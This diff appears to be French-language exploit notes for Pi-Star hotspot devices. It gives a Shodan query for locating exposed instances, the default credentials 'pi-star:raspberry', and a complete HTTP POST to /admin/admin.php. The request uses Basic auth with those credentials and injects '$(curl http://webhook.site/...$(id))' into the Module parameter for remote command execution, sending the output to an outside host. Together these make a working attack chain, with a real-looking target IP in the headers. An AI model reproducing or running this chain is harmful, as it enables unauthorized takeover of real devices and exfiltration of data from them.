@@ -2,3 +2,21 @@ shodan http.favicon.hash:432733105
 
 default cred sur ssh et interface web
 pi-star:raspberry
+
+Post Auth RCE via le web
+
+POST /admin/admin.php HTTP/1.1
+Host: xxxxxx
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 115
+Origin: http://121.169.46.217
+Authorization: Basic cGktc3RhcjpyYXNwYmVycnk=
+Connection: close
+Referer: http://121.169.46.217/admin/admin.php
+Upgrade-Insecure-Requests: 1
+
+RefName=REF001&Letter=C&Link=UNLINK&Module=$(curl%20http://webhook.site/xxxx/$(id))
